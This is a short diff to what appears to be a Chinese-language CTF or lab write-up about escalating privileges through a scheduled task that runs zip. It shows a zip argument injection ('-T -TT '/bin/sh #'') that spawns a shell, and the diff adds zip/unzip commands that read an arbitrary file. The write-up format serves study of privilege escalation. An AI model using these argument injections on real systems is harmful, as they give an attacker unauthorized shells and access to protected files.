@@ -96,4 +96,8 @@ inotifywait -m -e create /home/watcher/uploads
 这里是定时任务执行zip命令，那我们应该是要构造参数提权
 ```bash
 zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
+
+
+zip /path/to/temp-file /path/to/input-file
+unzip -p /path/to/temp-file
 ```
